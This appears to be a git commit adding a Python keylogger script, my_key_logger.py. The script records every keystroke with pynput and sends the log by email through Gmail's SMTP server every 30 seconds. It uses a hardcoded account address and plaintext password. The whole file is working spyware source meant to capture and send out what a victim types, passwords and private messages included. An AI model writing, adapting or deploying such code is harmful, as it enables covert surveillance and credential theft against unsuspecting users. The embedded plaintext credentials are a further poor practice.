a4e04f5658d8eee07c6ce2a739132ee5be4c714a
root <root@localhost.localdomain>
2019-01-11 14:03:34 -0500

    Initial commit

---
+++ my_key_logger.py
@@ -0,0 +1,40 @@
+import pynput.keyboard
+import smtplib
+import threading
+
+log = ""
+
+def callback_function(key):
+    global log
+    try:
+        log = log + key.char.encode("utf-8")
+        #log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + str(key)
+
+    print(log)
+
+def send_email(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
+
+#thread - threading
+
+def thread_function():
+    global log
+    send_email("blackouthacktesting@gmail.com", "testtest123456", log)
+    log = ""
+    timer_object = threading.Timer(30,thread_function)
+    timer_object.start()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+with keylogger_listener:
+    thread_function()
+    keylogger_listener.join()
+
